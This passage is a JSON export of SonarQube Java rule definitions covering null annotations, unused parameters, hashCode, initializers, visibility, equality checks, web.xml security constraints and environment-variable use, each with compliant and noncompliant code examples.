            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When using null-related annotations at global scope level, for instance using <code>javax.annotation.ParametersAreNonnullByDefault</code> (from\nJSR-305) at package level, it means that all the parameters to all the methods included in the package will, or should, be considered\nNon-<code>null</code>. It is equivalent to annotating every parameter in every method with non-null annotations (such as <code>@Nonnull</code>).</p>\n<p>The rule raises an issue every time a parameter could be <code>null</code> for a method invocation, where the method is annotated as forbidding\nnull parameters.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@javax.annotation.ParametersAreNonnullByDefault\nclass A {\n\n  void foo() {\n    bar(getValue()); // Noncompliant - method 'bar' do not expect 'null' values as parameter\n  }\n\n  void bar(Object o) { // 'o' is by contract expected never to be null\n    // ...\n  }\n\n  @javax.annotation.CheckForNull\n  abstract Object getValue();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Two solutions are possible: </p>\n<ul>\n  <li> The signature of the method is correct, and null check should be done prior to the call. </li>\n  <li> The signature of the method is not coherent and should be annotated to allow null values being passed as parameter </li>\n</ul>\n<pre>\n@javax.annotation.ParametersAreNonnullByDefault\nabstract class A {\n\n  void foo() {\n      Object o = getValue();\n      if (o != null) {\n        bar(o); // Compliant - 'o' can not be null\n      }\n  }\n\n  void bar(Object o) {\n    // ...\n  }\n\n  @javax.annotation.CheckForNull\n  abstract Object getValue();\n}\n</pre>\n<p>or </p>\n<pre>\n@javax.annotation.ParametersAreNonnullByDefault\nabstract class A {\n\n  void foo() {\n    bar(getValue());\n  }\n\n  void bar(@javax.annotation.Nullable Object o) { // annotation was missing\n    // ...\n  }\n\n  @javax.annotation.CheckForNull\n  abstract Object getValue();\n}\n</pre>",
            "mdDesc": "<p>When using null-related annotations at global scope level, for instance using <code>javax.annotation.ParametersAreNonnullByDefault</code> (from\nJSR-305) at package level, it means that all the parameters to all the methods included in the package will, or should, be considered\nNon-<code>null</code>. It is equivalent to annotating every parameter in every method with non-null annotations (such as <code>@Nonnull</code>).</p>\n<p>The rule raises an issue every time a parameter could be <code>null</code> for a method invocation, where the method is annotated as forbidding\nnull parameters.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@javax.annotation.ParametersAreNonnullByDefault\nclass A {\n\n  void foo() {\n    bar(getValue()); // Noncompliant - method 'bar' do not expect 'null' values as parameter\n  }\n\n  void bar(Object o) { // 'o' is by contract expected never to be null\n    // ...\n  }\n\n  @javax.annotation.CheckForNull\n  abstract Object getValue();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Two solutions are possible: </p>\n<ul>\n  <li> The signature of the method is correct, and null check should be done prior to the call. </li>\n  <li> The signature of the method is not coherent and should be annotated to allow null values being passed as parameter </li>\n</ul>\n<pre>\n@javax.annotation.ParametersAreNonnullByDefault\nabstract class A {\n\n  void foo() {\n      Object o = getValue();\n      if (o != null) {\n        bar(o); // Compliant - 'o' can not be null\n      }\n  }\n\n  void bar(Object o) {\n    // ...\n  }\n\n  @javax.annotation.CheckForNull\n  abstract Object getValue();\n}\n</pre>\n<p>or </p>\n<pre>\n@javax.annotation.ParametersAreNonnullByDefault\nabstract class A {\n\n  void foo() {\n    bar(getValue());\n  }\n\n  void bar(@javax.annotation.Nullable Object o) { // annotation was missing\n    // ...\n  }\n\n  @javax.annotation.CheckForNull\n  abstract Object getValue();\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1172",
            "repo": "java",
            "name": "Unused method parameters should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid doSomething(int a, int b) {     // \"b\" is unused\n  compute(a);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid doSomething(int a) {\n  compute(a);\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The rule will not raise issues for unused parameters:</p>\n<ul>\n  <li> that are annotated with <code>@javax.enterprise.event.Observes</code> </li>\n  <li> in overrides and implementation methods </li>\n  <li> in interface <code>default</code> methods </li>\n  <li> in non-private methods that only <code>throw</code> or that have empty bodies </li>\n  <li> in annotated methods, unless the annotation is <code>@SuppressWarning(\"unchecked\")</code> or <code>@SuppressWarning(\"rawtypes\")</code>, in\n  which case the annotation will be ignored </li>\n  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the parameter is documented with a proper\n  javadoc. </li>\n</ul>\n<pre>\n@Override\nvoid doSomething(int a, int b) {     // no issue reported on b\n  compute(a);\n}\n\npublic void foo(String s) {\n  // designed to be extended but noop in standard case\n}\n\nprotected void bar(String s) {\n  //open-closed principle\n}\n\npublic void qix(String s) {\n  throw new UnsupportedOperationException(\"This method should be implemented in subclasses\");\n}\n\n/**\n * @param s This string may be use for further computation in overriding classes\n */\nprotected void foobar(int a, String s) { // no issue, method is overridable and unused parameter has proper javadoc\n  compute(a);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "mdDesc": "<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid doSomething(int a, int b) {     // \"b\" is unused\n  compute(a);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid doSomething(int a) {\n  compute(a);\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The rule will not raise issues for unused parameters:</p>\n<ul>\n  <li> that are annotated with <code>@javax.enterprise.event.Observes</code> </li>\n  <li> in overrides and implementation methods </li>\n  <li> in interface <code>default</code> methods </li>\n  <li> in non-private methods that only <code>throw</code> or that have empty bodies </li>\n  <li> in annotated methods, unless the annotation is <code>@SuppressWarning(\"unchecked\")</code> or <code>@SuppressWarning(\"rawtypes\")</code>, in\n  which case the annotation will be ignored </li>\n  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the parameter is documented with a proper\n  javadoc. </li>\n</ul>\n<pre>\n@Override\nvoid doSomething(int a, int b) {     // no issue reported on b\n  compute(a);\n}\n\npublic void foo(String s) {\n  // designed to be extended but noop in standard case\n}\n\nprotected void bar(String s) {\n  //open-closed principle\n}\n\npublic void qix(String s) {\n  throw new UnsupportedOperationException(\"This method should be implemented in subclasses\");\n}\n\n/**\n * @param s This string may be use for further computation in overriding classes\n */\nprotected void foobar(int a, String s) { // no issue, method is overridable and unused parameter has proper javadoc\n  compute(a);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2141",
            "repo": "java",
            "name": "Classes that don't define \"hashCode()\" should not be used in hashes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Because <code>Object</code> implements <code>hashCode</code>, any Java class can be put into a hash structure. However, classes that define\n<code>equals(Object)</code> but not <code>hashCode()</code> aren't truly hash-able because instances that are equivalent according to the\n<code>equals</code> method can return different hashes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Student {  // no hashCode() method; not hash-able\n  // ...\n\n  public boolean equals(Object o) {\n    // ...\n  }\n}\n\npublic class School {\n  private Map&lt;Student, Integer&gt; studentBody = // okay so far\n          new HashTable&lt;Student, Integer&gt;(); // Noncompliant\n\n  // ...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Student {  // has hashCode() method; hash-able\n  // ...\n\n  public boolean equals(Object o) {\n    // ...\n  }\n  public int hashCode() {\n    // ...\n  }\n}\n\npublic class School {\n  private Map&lt;Student, Integer&gt; studentBody = new HashTable&lt;Student, Integer&gt;();\n\n  // ...\n</pre>",
            "mdDesc": "<p>Because <code>Object</code> implements <code>hashCode</code>, any Java class can be put into a hash structure. However, classes that define\n<code>equals(Object)</code> but not <code>hashCode()</code> aren't truly hash-able because instances that are equivalent according to the\n<code>equals</code> method can return different hashes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Student {  // no hashCode() method; not hash-able\n  // ...\n\n  public boolean equals(Object o) {\n    // ...\n  }\n}\n\npublic class School {\n  private Map&lt;Student, Integer&gt; studentBody = // okay so far\n          new HashTable&lt;Student, Integer&gt;(); // Noncompliant\n\n  // ...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Student {  // has hashCode() method; hash-able\n  // ...\n\n  public boolean equals(Object o) {\n    // ...\n  }\n  public int hashCode() {\n    // ...\n  }\n}\n\npublic class School {\n  private Map&lt;Student, Integer&gt; studentBody = new HashTable&lt;Student, Integer&gt;();\n\n  // ...\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4682",
            "repo": "java",
            "name": "\"@CheckForNull\" or \"@Nullable\" should not be used on primitive types",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>By definition, primitive types are not Objects and so they can't be <code>null</code>. Adding <code>@CheckForNull</code> or <code>@Nullable</code>\non primitive types adds confusion and is useless.</p>\n<p>This rule raises an issue when <code>@CheckForNull</code> or <code>@Nullable</code> is set on a method returning a primitive type: byte, short,\nint, long, float, double, boolean, char.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@CheckForNull\nboolean isFoo() {\n ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nboolean isFoo() {\n ...\n}\n</pre>",
            "mdDesc": "<p>By definition, primitive types are not Objects and so they can't be <code>null</code>. Adding <code>@CheckForNull</code> or <code>@Nullable</code>\non primitive types adds confusion and is useless.</p>\n<p>This rule raises an issue when <code>@CheckForNull</code> or <code>@Nullable</code> is set on a method returning a primitive type: byte, short,\nint, long, float, double, boolean, char.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@CheckForNull\nboolean isFoo() {\n ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nboolean isFoo() {\n ...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1171",
            "repo": "java",
            "name": "Only static class initializers should be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Non-static initializers are rarely used, and can be confusing for most developers because they only run when new class instances are created. When\npossible, non-static initializers should be refactored into standard constructors or field initializers.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;() {\n\n    // Noncompliant - HashMap should be extended only to add behavior, not for initialization\n    {\n      put(\"a\", \"b\");\n    }\n\n  };\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;();\n\n  static {\n    MY_MAP.put(\"a\", \"b\");\n  }\n}\n</pre>\n<p>or using Guava:</p>\n<pre>\nclass MyClass {\n  // Compliant\n  private static final Map&lt;String, String&gt; MY_MAP = ImmutableMap.of(\"a\", \"b\");\n}\n</pre>",
            "mdDesc": "<p>Non-static initializers are rarely used, and can be confusing for most developers because they only run when new class instances are created. When\npossible, non-static initializers should be refactored into standard constructors or field initializers.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;() {\n\n    // Noncompliant - HashMap should be extended only to add behavior, not for initialization\n    {\n      put(\"a\", \"b\");\n    }\n\n  };\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;();\n\n  static {\n    MY_MAP.put(\"a\", \"b\");\n  }\n}\n</pre>\n<p>or using Guava:</p>\n<pre>\nclass MyClass {\n  // Compliant\n  private static final Map&lt;String, String&gt; MY_MAP = ImmutableMap.of(\"a\", \"b\");\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2260",
            "repo": "java",
            "name": "Java parser failure",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When the Java parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number\nof files that do not parse but also to easily find out why they do not parse.</p>",
            "mdDesc": "<p>When the Java parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number\nof files that do not parse but also to easily find out why they do not parse.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1170",
            "repo": "java",
            "name": "Public constants and fields initialized at declaration should be \"static final\" rather than merely \"final\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Making a <code>public</code> constant just <code>final</code> as opposed to <code>static final</code> leads to duplicating its value for every\ninstance of the class, uselessly increasing the amount of memory required to execute the application.</p>\n<p>Further, when a non-<code>public</code>, <code>final</code> field isn't also <code>static</code>, it implies that different instances can have\ndifferent values. However, initializing a non-<code>static final</code> field in its declaration forces every instance to have the same value. So such\nfields should either be made <code>static</code> or initialized in the constructor.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Myclass {\n  public final int THRESHOLD = 3;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Myclass {\n  public static final int THRESHOLD = 3;    // Compliant\n}\n</pre>\n<h2>Exceptions</h2>\n<p>No issues are reported on final fields of inner classes whose type is not a primitive or a String. Indeed according to the Java specification:</p>\n<blockquote>\n  <p>An inner class is a nested class that is not explicitly or implicitly declared static. Inner classes may not declare static initializers (§8.7)\n  or member interfaces. Inner classes may not declare static members, unless they are compile-time constant fields (§15.28).</p>\n</blockquote>",
            "mdDesc": "<p>Making a <code>public</code> constant just <code>final</code> as opposed to <code>static final</code> leads to duplicating its value for every\ninstance of the class, uselessly increasing the amount of memory required to execute the application.</p>\n<p>Further, when a non-<code>public</code>, <code>final</code> field isn't also <code>static</code>, it implies that different instances can have\ndifferent values. However, initializing a non-<code>static final</code> field in its declaration forces every instance to have the same value. So such\nfields should either be made <code>static</code> or initialized in the constructor.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Myclass {\n  public final int THRESHOLD = 3;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Myclass {\n  public static final int THRESHOLD = 3;    // Compliant\n}\n</pre>\n<h2>Exceptions</h2>\n<p>No issues are reported on final fields of inner classes whose type is not a primitive or a String. Indeed according to the Java specification:</p>\n<blockquote>\n  <p>An inner class is a nested class that is not explicitly or implicitly declared static. Inner classes may not declare static initializers (§8.7)\n  or member interfaces. Inner classes may not declare static members, unless they are compile-time constant fields (§15.28).</p>\n</blockquote>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3369",
            "repo": "java",
            "name": "Security constraints should be defined",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Websphere, Tomcat, and JBoss web servers allow the definition of role-based access to servlets. It may not be granular enough for your purposes,\nbut it's a start, and should be used at least as a base.</p>\n<p>This rule raises an issue when a <em>web.xml</em> file has no <code>&lt;security-constraint&gt;</code> elements.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/284.html\">MITRE, CWE-284</a> - Improper Access Control </li>\n</ul>",
            "mdDesc": "<p>Websphere, Tomcat, and JBoss web servers allow the definition of role-based access to servlets. It may not be granular enough for your purposes,\nbut it's a start, and should be used at least as a base.</p>\n<p>This rule raises an issue when a <em>web.xml</em> file has no <code>&lt;security-constraint&gt;</code> elements.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/284.html\">MITRE, CWE-284</a> - Improper Access Control </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "jee",
                "owasp-a5",
                "websphere"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "3h",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "3h",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "3h",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "3h",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S2039",
            "repo": "java",
            "name": "Member variable visibility should be specified",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Failing to explicitly declare the visibility of a member variable could result it in having a visibility you don't expect, and potentially leave it\nopen to unexpected modification by other classes. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Ball {\n    String color=\"red\";  // Noncompliant\n}\nenum A {\n  B;\n  int a;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Ball {\n    private String color=\"red\";  // Compliant\n}\nenum A {\n  B;\n  private int a;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Members annotated with Guava's <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed\nto make the code testable.</p>\n<pre>\nclass Cone {\n  @VisibleForTesting\n  Logger logger; // Compliant\n}\n</pre>",
            "mdDesc": "<p>Failing to explicitly declare the visibility of a member variable could result it in having a visibility you don't expect, and potentially leave it\nopen to unexpected modification by other classes. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Ball {\n    String color=\"red\";  // Noncompliant\n}\nenum A {\n  B;\n  int a;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Ball {\n    private String color=\"red\";  // Compliant\n}\nenum A {\n  B;\n  private int a;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Members annotated with Guava's <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed\nto make the code testable.</p>\n<pre>\nclass Cone {\n  @VisibleForTesting\n  Logger logger; // Compliant\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2159",
            "repo": "java",
            "name": "Silly equality checks should not be made",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Comparisons of dissimilar types will always return false. The comparison and all its dependent code can simply be removed. This includes:</p>\n<ul>\n  <li> comparing an object with null </li>\n  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>\n  <li> comparing unrelated classes </li>\n  <li> comparing an unrelated <code>class</code> and <code>interface</code> </li>\n  <li> comparing unrelated <code>interface</code> types </li>\n  <li> comparing an array to a non-array </li>\n  <li> comparing two arrays </li>\n</ul>\n<p>Specifically in the case of arrays, since arrays don't override <code>Object.equals()</code>, calling <code>equals</code> on two arrays is the same\nas comparing their addresses. This means that <code>array1.equals(array2)</code> is equivalent to <code>array1==array2</code>.</p>\n<p>However, some developers might expect <code>Array.equals(Object obj)</code> to do more than a simple memory address comparison, comparing for\ninstance the size and content of the two arrays. Instead, the <code>==</code> operator or <code>Arrays.equals(array1, array2)</code> should always be\nused with arrays.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ninterface KitchenTool { ... };\ninterface Plant {...}\n\npublic class Spatula implements KitchenTool { ... }\npublic class Tree implements Plant { ...}\n//...\n\nSpatula spatula = new Spatula();\nKitchenTool tool = spatula;\nKitchenTool [] tools = {tool};\n\nTree tree = new Tree();\nPlant plant = tree;\nTree [] trees = {tree};\n\n\nif (spatula.equals(tree)) { // Noncompliant; unrelated classes\n  // ...\n}\nelse if (spatula.equals(plant)) { // Noncompliant; unrelated class and interface\n  // ...\n}\nelse if (tool.equals(plant)) { // Noncompliant; unrelated interfaces\n  // ...\n}\nelse if (tool.equals(tools)) { // Noncompliant; array &amp; non-array\n  // ...\n}\nelse if (trees.equals(tools)) { // Noncompliant; incompatible arrays\n  // ...\n}\nelse if (tree.equals(null)) { // Noncompliant\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5zdGBQ\">CERT, EXP02-J.</a> - Do not use the Object.equals() method to compare two arrays </li>\n</ul>",
            "mdDesc": "<p>Comparisons of dissimilar types will always return false. The comparison and all its dependent code can simply be removed. This includes:</p>\n<ul>\n  <li> comparing an object with null </li>\n  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>\n  <li> comparing unrelated classes </li>\n  <li> comparing an unrelated <code>class</code> and <code>interface</code> </li>\n  <li> comparing unrelated <code>interface</code> types </li>\n  <li> comparing an array to a non-array </li>\n  <li> comparing two arrays </li>\n</ul>\n<p>Specifically in the case of arrays, since arrays don't override <code>Object.equals()</code>, calling <code>equals</code> on two arrays is the same\nas comparing their addresses. This means that <code>array1.equals(array2)</code> is equivalent to <code>array1==array2</code>.</p>\n<p>However, some developers might expect <code>Array.equals(Object obj)</code> to do more than a simple memory address comparison, comparing for\ninstance the size and content of the two arrays. Instead, the <code>==</code> operator or <code>Arrays.equals(array1, array2)</code> should always be\nused with arrays.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ninterface KitchenTool { ... };\ninterface Plant {...}\n\npublic class Spatula implements KitchenTool { ... }\npublic class Tree implements Plant { ...}\n//...\n\nSpatula spatula = new Spatula();\nKitchenTool tool = spatula;\nKitchenTool [] tools = {tool};\n\nTree tree = new Tree();\nPlant plant = tree;\nTree [] trees = {tree};\n\n\nif (spatula.equals(tree)) { // Noncompliant; unrelated classes\n  // ...\n}\nelse if (spatula.equals(plant)) { // Noncompliant; unrelated class and interface\n  // ...\n}\nelse if (tool.equals(plant)) { // Noncompliant; unrelated interfaces\n  // ...\n}\nelse if (tool.equals(tools)) { // Noncompliant; array &amp; non-array\n  // ...\n}\nelse if (trees.equals(tools)) { // Noncompliant; incompatible arrays\n  // ...\n}\nelse if (tree.equals(null)) { // Noncompliant\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5zdGBQ\">CERT, EXP02-J.</a> - Do not use the Object.equals() method to compare two arrays </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5304",
            "repo": "java",
            "name": "Using environment variables is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using environment variables is security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278\">CVE-2014-6278</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3464\">CVE-2019-3464</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000402\">CVE-2018-1000402</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10530\">CVE-2016-10530</a> </li>\n</ul>\n<p>Environment variables are sensitive to injection attacks, just like any other input.</p>\n<p>Note also that environment variables can be exposed in multiple ways, storing sensitive information in them should be done carefully:</p>\n<ul>\n  <li> on Unix systems environment variables of one process can be read by another process running with the same UID. </li>\n  <li> environment variables <a href=\"https://docs.oracle.com/javase/tutorial/essential/environment/env.html\">might be forwarded to child\n  processes</a>. </li>\n  <li> application running in debug mode often exposes their environment variable. </li>\n</ul>\n<p>This rule raises an issue when environment variables are read.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Environment variables are used without being sanitized. </li>\n  <li> You store sensitive information in environment variables and other processes might be able to access them. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Sanitize every environment variable before using its value.</p>\n<p>If you store sensitive information in an environment variable, make sure that no other process can access them, i.e. the process runs with a\nseparate user account and child processes don't have access to their parent's environment.</p>\n<p>Don't run your application in 